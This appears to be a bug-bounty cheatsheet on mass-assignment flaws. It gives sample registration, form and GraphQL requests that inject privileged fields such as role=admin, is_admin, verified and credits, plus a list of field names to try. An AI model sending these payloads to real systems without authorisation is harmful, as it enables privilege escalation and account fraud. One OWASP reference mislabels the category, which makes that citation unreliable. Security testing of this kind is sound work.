---
tags: [bugbounty, vuln/mass-assignment, cheatsheet, p2, p3]
aliases: [Mass Assignment, Parameter Binding, Auto-binding]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Mass Assignment

> [!tldr] Hunter Summary
> **What:** Framework auto-binds user-supplied JSON/form fields to model objects — attacker adds fields like `role`, `is_admin`, `verified`.
> **Impact:** Privilege escalation, account verification bypass, hidden field injection.
> **Best targets:** User registration, profile update, any POST/PUT/PATCH to objects.
> **Time to triage:** 10 min. Add `role=admin` or `is_admin=true` to any user creation/update request.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Registration | `POST /api/users` with email + password |
| Profile update | `PUT /api/user/profile` |
| Any resource creation | `POST /api/orders`, `POST /api/tickets` |
| Admin creation | `POST /admin/users/create` |
| Account update | `PATCH /api/account` |

---

## Step-by-Step Hunt

### Step 1 — Find object creation/update endpoints
Look at: signup, profile edit, any resource POST.

### Step 2 — Add guessed privileged fields
```bash
# Normal registration:
POST /api/users
{"email": "test@test.com", "password": "test123"}

# Try adding:
POST /api/users
{
  "email": "test@test.com",
  "password": "test123",
  "role": "admin",
  "is_admin": true,
  "admin": true,
  "isAdmin": true,
  "verified": true,
  "email_verified": true,
  "subscription": "premium",
  "plan": "enterprise",
  "credits": 10000,
  "account_type": "admin"
}
```

### Step 3 — Check for field names in responses
API responses often reveal model field names:
```json
{
  "id": 1,
  "email": "user@example.com",
  "role": "user",           ← "role" is a real field
  "is_verified": false,     ← try setting to true
  "credits": 0,             ← try setting to 1000
  "subscription_tier": "free"  ← try "premium"
}
```

### Step 4 — Test with guessed fields from API docs
If the app has Swagger/OpenAPI docs — read the schema definitions for all model fields, then try injecting non-user-facing fields.

### Step 5 — HTTP Parameter Pollution variant
```
# Form-based mass assignment
POST /profile
username=test&role=admin&role=user   (HPP)
username=test&role[]=admin
```

### Step 6 — GraphQL mass assignment
```graphql
mutation {
  createUser(
    email: "test@test.com"
    password: "test"
    role: ADMIN        # should not be accepted
    verified: true     # should not be accepted
  ) { id role }
}
```

---

## Common Field Names to Try

```
role  is_admin  admin  superuser  verified
email_verified  is_verified  account_verified
plan  subscription  tier  account_type
credits  tokens  balance  quota
permissions  scopes  capabilities
internal  beta  early_access
banned  blocked  disabled
```

---

## 2025-2026 Notes

> [!info] Mass assignment (2025-2026)
> - **AI feature fields:** `ai_enabled: true`, `ai_credits: 9999`, `ai_tier: enterprise`
> - **Feature flags:** `beta_features: true`, `experimental: true`
> - **GraphQL input types:** Nested mutation input objects often have privileged fields not validated at input level

---

## References

- PortSwigger Mass Assignment — https://portswigger.net/web-security/api-testing/mass-assignment-vulnerabilities
- OWASP API Security A6:2023 — Unrestricted Access to Sensitive Business Flows
